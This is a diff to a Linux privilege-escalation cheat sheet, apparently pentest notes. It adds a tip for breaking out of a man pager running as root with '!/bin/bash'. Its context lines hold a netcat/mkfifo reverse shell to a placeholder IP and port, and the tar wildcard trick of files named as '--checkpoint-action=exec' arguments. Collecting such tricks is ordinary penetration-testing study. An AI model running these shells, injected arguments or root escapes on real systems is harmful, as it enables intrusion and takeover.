@@ -775,6 +775,12 @@ echo "mkfifo /tmp/lhennp; nc <IP> <PORT> 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>
 echo "" > "--checkpoint-action=exec=sh shell.sh"
 echo "" > --checkpoint=1
 ```
+
+#### Man pages
+ As the pager is being executed with root privileges, we can break out of the pager with a root shell. Go into man page and enter `
+ ```
+ !/bin/bash
+ ```
   
 ### Privesc Linux Tricks
 #### Write to /etc/passwd
